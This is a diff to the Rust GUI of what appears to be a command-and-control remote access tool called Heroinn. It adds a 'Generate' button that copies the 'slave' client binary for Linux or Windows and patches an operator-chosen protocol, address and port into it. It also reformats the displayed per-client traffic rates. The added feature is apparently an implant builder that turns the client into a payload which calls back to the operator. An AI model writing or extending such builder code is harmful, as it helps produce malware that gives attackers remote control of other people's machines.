@@ -2,7 +2,7 @@ use controller::*;
 //use dlg::file::FileDlg;
 use eframe::egui::{self};
 use egui_extras::{Size, StripBuilder , TableBuilder};
-use heroinn_util::*;
+use heroinn_util::{*, ftp::method::transfer_speed, gen::replace_connection_info_to_new_file};
 
 mod controller;
 
@@ -251,6 +251,49 @@ impl HeroinnApp {
                                 ui.end_row();
                             });
                             ui.separator();
+
+                            StripBuilder::new(ui)
+                            .size(Size::exact(570.0))
+                            .size(Size::exact(60.0))
+                            .horizontal(|mut strip| {
+                                strip.cell(|_ui|{
+
+                                });
+                                strip.cell(|ui|{
+                                    if ui.button("Generate").clicked(){
+                                        let path = std::env::current_dir().unwrap();
+
+                                        let res = rfd::FileDialog::new()
+                                            .add_filter("bin", &["*"])
+                                            .set_directory(&path)
+                                            .save_file().unwrap();
+                                        
+                                        let new_path = res.to_str().unwrap().to_string();
+
+                                        let slave_file_path = match self.combox_generator_platform{
+                                            HeroinnPlatform::LinuxX64 => path.join("heroinn_client").to_str().unwrap().to_string(),
+                                            HeroinnPlatform::WindowsX64 => path.join("heroinn_client.exe").to_str().unwrap().to_string(),
+                                        };
+
+                                        match replace_connection_info_to_new_file(
+                                            &slave_file_path , 
+                                            &new_path, 
+                                            ConnectionInfo { 
+                                                protocol: self.combox_generator_protocol.to_u8(), 
+                                                address: format!("{}:{}" , self.text_generator_address , self.text_generator_port), 
+                                                remark: self.text_generator_remark.clone() 
+                                        }){
+                                            Ok(_) => {
+                                                msgbox::info(&"Generator".to_string(), &format!("Success!"));
+                                            },
+                                            Err(e) => {
+                                                msgbox::error(&"Generator".to_string(), &format!("{}" ,e));
+                                            },
+                                        }
+                                    }
+                                });
+                            });
+
                         });
 
                         strip.cell(|ui| {
@@ -431,13 +474,13 @@ impl HeroinnApp {
                         row.col(|ui| {
                             let secs = cur_timestamp_secs() - info.last_heartbeat;
                             let in_rate = info.in_rate / (secs + HEART_BEAT_TIME);
-                            ui.label(format!("{} byte/s", in_rate));
+                            ui.label(transfer_speed(in_rate as f64));
                         }).context_menu(menu);
 
                         row.col(|ui| {
                             let secs = cur_timestamp_secs() - info.last_heartbeat;
                             let out_rate = info.out_rate / (secs + HEART_BEAT_TIME);
-                            ui.label(format!("{} byte/s", out_rate));
+                            ui.label(transfer_speed(out_rate as f64));
                         }).context_menu(menu);
 
                         row.col(|ui| {
